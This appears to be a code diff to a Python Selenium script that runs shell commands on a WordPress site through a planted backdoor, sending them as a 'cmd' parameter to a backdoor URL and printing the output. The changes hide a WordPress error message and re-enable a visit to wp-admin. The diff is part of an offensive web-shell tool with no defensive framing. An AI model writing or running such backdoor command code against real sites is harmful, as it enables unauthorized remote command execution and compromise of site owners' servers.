@@ -156,7 +156,8 @@ def cmd():
             else:
                 driver.get(f'{backdoor_url}?cmd={cmd}')
                 cleantext = BeautifulSoup(driver.page_source, "lxml").text
-                print(cleantext)
+                if not 'wordpress is currently unable to handle this request' in cleantext:
+                    print(cleantext)
     except Exception as e:
         print(f'Comamnd Execution Failed : {e}')
         exit(-1)
@@ -176,7 +177,7 @@ def main():
         check_backdoor(p_name, f_name)
         cmd()
     time.sleep(2)
-    #driver.get(args.url+'/wp-admin/index.php')
+    driver.get(args.url+'/wp-admin/index.php')
     print("\n| End")
     exit()
 
